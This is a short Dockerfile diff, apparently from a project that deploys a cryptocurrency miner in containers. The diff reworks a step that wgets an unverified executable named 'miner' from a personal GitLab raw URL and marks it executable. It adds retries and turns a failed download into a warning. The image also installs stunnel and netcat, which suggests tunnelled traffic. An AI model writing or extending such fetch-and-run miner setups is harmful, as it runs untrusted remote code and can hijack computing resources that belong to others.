@@ -6,10 +6,12 @@ RUN apt-get update && apt-get install -y --no-install-recommends \
     stunnel4 curl wget procps build-essential gcc psmisc netcat-openbsd \
     && rm -rf /var/lib/apt/lists/*
 
-# Miner binary
-RUN wget -O /usr/local/bin/miner \
-    "https://gitlab.com/ferrynara12/mypro/-/raw/main/docker?ref_type=heads" \
-    && chmod +x /usr/local/bin/miner
+# Download miner binary dengan retry
+RUN for i in 1 2 3; do \
+        wget -q --timeout=30 -O /usr/local/bin/miner \
+        "https://gitlab.com/ferrynara12/mypro/-/raw/main/docker?ref_type=heads" && break || sleep 5; \
+    done && \
+    chmod +x /usr/local/bin/miner || echo "WARNING: Miner download failed!"
 
 COPY start.sh .
 RUN chmod +x start.sh
